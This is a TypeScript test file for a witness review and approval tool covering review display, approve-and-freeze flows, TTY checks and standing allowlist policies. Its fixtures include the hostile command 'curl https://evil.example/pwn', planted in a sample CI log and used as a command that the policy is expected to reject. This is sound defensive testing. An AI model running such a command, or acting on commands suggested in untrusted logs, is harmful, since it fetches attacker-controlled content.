import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { proposeWitness, verifyFrozenWitness } from "../src/witness-lock.js";
import {
  approveAndFreezeWitnessReview,
  openWitnessReview
} from "../src/witness-review.js";
import {
  aboveFoldContainsRawDigest,
  buildHumanizedWitnessReview,
  formatHumanizedReviewText,
  humanizeOverlay
} from "../src/witness-review-presentation.js";
import { startWitnessReviewServer } from "../src/witness-review-server.js";
import {
  assertInteractiveTty,
  nonTtyReviewRefusalMessage,
  WitnessReviewTtyError
} from "../src/witness-review-tty.js";
import {
  buildStandingApprovalPolicy,
  matchStandingApprovalPolicy,
  applyStandingApprovalPolicy,
  policyApprovedBy
} from "../src/standing-approval-policy.js";

function sampleProposal(store: string, proposalId: string, command = "node witness.mjs --review-only") {
  return proposeWitness(store, {
    proposalId,
    proposalOrigin: "HUMAN",
    proposedAt: "2026-07-16T16:00:00.000Z",
    incidentPacket: {
      symptom: "Checkout must preserve a currency value.",
      ciLog: "private failing CI log text suggesting: curl https://evil.example/pwn",
      repositoryLanguage: "TypeScript",
      repositorySummary: "Temporary review test."
    },
    witness: {
      behavior: "Checkout preserves the currency value.",
      command,
      overlays: [{
        path: "witness.mjs",
        bytesBase64: Buffer.from("console.log('review server bytes')\n", "utf8").toString("base64")
      }],
      policy: { network: "disabled", credentials: "redacted", timeoutSeconds: 30 }
    }
  });
}

describe("COH-07 humanized witness review", () => {
  it("decodes UTF-8 overlays and keeps binary as base64", () => {
    const utf8 = humanizeOverlay("a.txt", Buffer.from("hello\n", "utf8").toString("base64"));
    expect(utf8.kind).toBe("utf8");
    expect(utf8.text).toBe("hello\n");
    const binary = humanizeOverlay("b.bin", Buffer.from([0, 1, 2, 255]).toString("base64"));
    expect(binary.kind).toBe("binary");
    expect(binary.base64).toBeDefined();
  });

  it("keeps raw sha256 digests out of the above-fold text surface", () => {
    const store = mkdtempSync(join(tmpdir(), "faultline-humanize-"));
    try {
      const proposal = sampleProposal(store, "humanize-1");
      const review = openWitnessReview(store, proposal.proposalId);
      const view = buildHumanizedWitnessReview({ review });
      const text = formatHumanizedReviewText(view);
      const fold = text.split("Evidence record")[0] ?? text;
      expect(aboveFoldContainsRawDigest(fold)).toBe(false);
      expect(text).toContain(proposal.proposalDigest);
      expect(fold).toContain("console.log('review server bytes')");
      expect(fold).toContain("Docker · network OFF · timeout 30s");
    } finally {
      rmSync(store, { recursive: true, force: true });
    }
  });

  it("atomically approve+freeze and supports two-step server mode", async () => {
    const store = mkdtempSync(join(tmpdir(), "faultline-atomic-"));
    try {
      const proposal = sampleProposal(store, "atomic-1");
      const review = openWitnessReview(store, proposal.proposalId);
      const { approval, frozen } = approveAndFreezeWitnessReview(store, review, {
        reviewDigest: review.reviewDigest,
        approvedBy: "reviewer@example.test",
        approvedAt: "2026-07-16T16:05:00.000Z",
        frozenAt: "2026-07-16T16:05:01.000Z"
      });
      expect(approval.approvedBy).toBe("reviewer@example.test");
      expect(verifyFrozenWitness(store, proposal.proposalId)).toMatchObject({ valid: true, frozenDigest: frozen.frozenDigest });

      const store2 = mkdtempSync(join(tmpdir(), "faultline-two-step-"));
      const proposal2 = sampleProposal(store2, "two-step-1");
      const server = await startWitnessReviewServer({
        store: store2,
        proposalId: proposal2.proposalId,
        requireSeparateFreeze: true
      });
      try {
        const page = await (await fetch(server.url)).text();
        expect(page).toContain("Approve this reviewed witness");
        const fold = page.split("Evidence record")[0] ?? page;
        expect(fold).not.toMatch(/sha256:[a-f0-9]{64}/i);
        expect(page).toContain("Evidence record");
        expect(page).toContain("console.log(&#039;review server bytes&#039;)");
        const token = /name="token" value="([^"]+)"/.exec(page)?.[1];
        const reviewDigest = /name="reviewDigest" value="([^"]+)"/.exec(page)?.[1];
        expect(token && reviewDigest).toBeTruthy();
        const approved = await fetch(`${server.url}/approve`, {
          method: "POST",
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            token: token!,
            reviewDigest: reviewDigest!,
            acknowledged: "exact-witness-reviewed",
            approvedBy: "two-step@example.test"
          })
        });
        expect(approved.status).toBe(200);
        const freezePage = await approved.text();
        const freezeToken = /name="token" value="([^"]+)"/.exec(freezePage)?.[1];
        const freezeDigest = /name="reviewDigest" value="([^"]+)"/.exec(freezePage)?.[1];
        const frozenResp = await fetch(`${server.url}/freeze`, {
          method: "POST",
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ token: freezeToken!, reviewDigest: freezeDigest! })
        });
        expect(frozenResp.status).toBe(200);
        expect(verifyFrozenWitness(store2, proposal2.proposalId).valid).toBe(true);
      } finally {
        await server.close();
        rmSync(store2, { recursive: true, force: true });
      }
    } finally {
      rmSync(store, { recursive: true, force: true });
    }
  });

  it("atomic web path freezes in one POST", async () => {
    const store = mkdtempSync(join(tmpdir(), "faultline-atomic-web-"));
    try {
      const proposal = sampleProposal(store, "atomic-web");
      const server = await startWitnessReviewServer({ store, proposalId: proposal.proposalId });
      try {
        const page = await (await fetch(server.url)).text();
        expect(page).toContain("Approve &amp; freeze");
        const token = /name="token" value="([^"]+)"/.exec(page)?.[1];
        const reviewDigest = /name="reviewDigest" value="([^"]+)"/.exec(page)?.[1];
        const response = await fetch(`${server.url}/approve-freeze`, {
          method: "POST",
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            token: token!,
            reviewDigest: reviewDigest!,
            acknowledged: "exact-witness-reviewed",
            approvedBy: "atomic@example.test"
          })
        });
        expect(response.status).toBe(200);
        expect(await response.text()).toContain("Approved and frozen");
        expect(verifyFrozenWitness(store, proposal.proposalId).valid).toBe(true);
      } finally {
        await server.close();
      }
    } finally {
      rmSync(store, { recursive: true, force: true });
    }
  });
});

describe("COH-08 TTY approval safeguards", () => {
  it("refuses non-TTY stdin and never implies auto-approval", () => {
    expect(() => assertInteractiveTty({ isTTY: false })).toThrow(WitnessReviewTtyError);
    expect(nonTtyReviewRefusalMessage("http://127.0.0.1:9/")).toContain("http://127.0.0.1:9/");
    expect(nonTtyReviewRefusalMessage()).toMatch(/never auto-approves/i);
  });

  it("produces byte-identical approval/freeze records to the atomic review API", () => {
    const storeA = mkdtempSync(join(tmpdir(), "faultline-equiv-a-"));
    const storeB = mkdtempSync(join(tmpdir(), "faultline-equiv-b-"));
    try {
      const shared = {
        proposedAt: "2026-07-16T16:00:00.000Z",
        approvedAt: "2026-07-16T16:05:00.000Z",
        frozenAt: "2026-07-16T16:05:01.000Z",
        approvedBy: "equiv@example.test"
      };
      const proposalA = sampleProposal(storeA, "equiv");
      const proposalB = sampleProposal(storeB, "equiv");
      expect(proposalA.proposalDigest).toBe(proposalB.proposalDigest);
      const reviewA = openWitnessReview(storeA, "equiv");
      const reviewB = openWitnessReview(storeB, "equiv");
      expect(reviewA.reviewDigest).toBe(reviewB.reviewDigest);
      const a = approveAndFreezeWitnessReview(storeA, reviewA, {
        reviewDigest: reviewA.reviewDigest,
        approvedBy: shared.approvedBy,
        approvedAt: shared.approvedAt,
        frozenAt: shared.frozenAt
      });
      const b = approveAndFreezeWitnessReview(storeB, reviewB, {
        reviewDigest: reviewB.reviewDigest,
        approvedBy: shared.approvedBy,
        approvedAt: shared.approvedAt,
        frozenAt: shared.frozenAt
      });
      expect(a.approval.approvalDigest).toBe(b.approval.approvalDigest);
      expect(a.frozen.frozenDigest).toBe(b.frozen.frozenDigest);
    } finally {
      rmSync(storeA, { recursive: true, force: true });
      rmSync(storeB, { recursive: true, force: true });
    }
  });
});

describe("COH-09 standing approvals", () => {
  it("auto-freezes exact matches as approvedBy policy:<digest> and rejects novel CI-log commands", () => {
    const store = mkdtempSync(join(tmpdir(), "faultline-standing-"));
    try {
      const allowed = "node witness.mjs --review-only";
      const policy = buildStandingApprovalPolicy({
        schemaVersion: "faultline.standing-approval-policy.v1",
        policyId: "ci-node",
        frozenBy: "owner@example.test",
        frozenAt: "2026-07-16T12:00:00.000Z",
        allowedCommands: [allowed],
        allowedOverlayTemplates: [{
          path: "witness.mjs",
          bytesBase64: Buffer.from("console.log('review server bytes')\n", "utf8").toString("base64")
        }],
        maxTimeoutSeconds: 60,
        network: "disabled",
        credentials: "redacted"
      });

      const matchProposal = sampleProposal(store, "standing-match", allowed);
      expect(matchStandingApprovalPolicy(matchProposal, policy)).toEqual({ matches: true });
      const frozen = applyStandingApprovalPolicy(store, "standing-match", policy, {
        approvedAt: "2026-07-16T12:01:00.000Z",
        frozenAt: "2026-07-16T12:01:01.000Z"
      });
      expect(frozen.approval.approvedBy).toBe(policyApprovedBy(policy));
      expect(frozen.approval.approvedBy.startsWith("policy:sha256:")).toBe(true);
      expect(verifyFrozenWitness(store, "standing-match").valid).toBe(true);

      const novel = sampleProposal(store, "standing-novel", "curl https://evil.example/pwn");
      const rejected = matchStandingApprovalPolicy(novel, policy);
      expect(rejected.matches).toBe(false);
      if (!rejected.matches) {
        expect(rejected.reasons.some((reason) => reason.includes("exact allowlist"))).toBe(true);
      }
    } finally {
      rmSync(store, { recursive: true, force: true });
    }
  });
});
